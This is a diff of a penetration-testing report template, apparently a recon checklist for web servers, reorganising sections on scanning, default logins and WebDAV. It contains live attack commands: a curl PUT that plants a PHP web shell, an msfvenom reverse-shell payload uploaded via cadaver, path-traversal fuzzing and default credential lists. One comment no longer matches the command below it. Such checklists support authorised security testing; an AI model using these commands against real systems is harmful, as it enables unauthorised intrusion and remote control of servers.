@@ -252,11 +252,9 @@ mysql --host=INSERTIPADDRESS -u root -p
 
 ### Webservers ######################################################################################################################
 
-INSERTWIGSCAN
+#### Automated Checks
 
-```
-wig-git http://INSERTIPADDRESS/path
-```
+INSERTWIGSCAN
 
 #### Nikto scan
 
@@ -266,19 +264,34 @@ INSERTNIKTOSCAN
 
 INSERTDIRBSCAN
 
-#### Manual Scan
-
-```
-Step 1:
-View Source!
-
-Step 2: 
-Robots.txt!
-```
-wig-git -a -q -t 5 INSERTIPADDRESS
- --proxy PROXY 
+#### Robots
 
 INSERTROBOTS
+
+
+#### Default/Weak login
+
+Google documentation for default passwords and test them:
+
+```
+site:webapplication.com password
+https://cirt.net/passwords
+```
+
+```
+admin admin
+admin password
+admin <blank>
+admin nameofservice
+root root
+root admin
+root password
+root nameofservice
+<username if you have> password
+<username if you have> admin
+<username if you have> username
+<username if you have> nameofservice
+```
 ```
 Step 3: 
 Browse around and look for disclosed PII on site
@@ -286,14 +299,23 @@ Browse around and look for disclosed PII on site
 *Place anything here
 ```
 
+#### Manual Checks
 
+```
+Step 1:
+View Source
+
+Step 2: 
+Start Secondary Scans
+```
+
+wig-git http://INSERTIPADDRESS/path
 
 ```
 # CMS checker 
-wig-git http://INSERTIPADDRESS -a -m
 cmsmap-git -t http://INSERTIPADDRESS
 
-# Nikto
+#Full Nikto
 nikto -h http://INSERTIPADDRESS
 
 # Nikto with squid proxy
@@ -305,55 +327,32 @@ curl -i INSERTIPADDRESS
 # Get everything
 curl -i -L INSERTIPADDRESS
 
-# Check for title and all links
-curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
-
-# Look at page with just text
-curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq
-
-# Check if it is possible to upload
+# Check if it is possible to upload using put
 curl -v -X OPTIONS http://INSERTIPADDRESS/
 curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
 
+# Check for title and all links
 dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
-
-```
-
-#### Default/Weak login
-
-Search documentation for default passwords and test them
-
-```
-site:webapplication.com password
-https://cirt.net/passwords
-```
-
-```
-admin admin
-admin password
-admin <blank>
-admin <servicename>
-root root
-root admin
-root password
-root <servicename>
-<username if you have> password
-<username if you have> admin
-<username if you have> username
-username <servicename>
-```
-
-#### Url brute force
-
-```
-# Dirb
-dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt
 
 #To append a .pl to the end of the resolutions:
 dirb http://INSERTIPADDRESS/somedirectory -X .pl
 
-# Gobuster - remove relevant responde codes (403 for example)
-gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+```
+
+#### WebDav
+
+```
+Try to put a shell.php
+
+cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f php -o shell.php
+
+cadaver INSERTIPADDRESS
+
+put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.php
+If the .asp extention is not allowed, try shell.asp.txt and use the mv command
+
+user: wampp
+pass: xampp 
 ```
 
 #### LFI/RFI
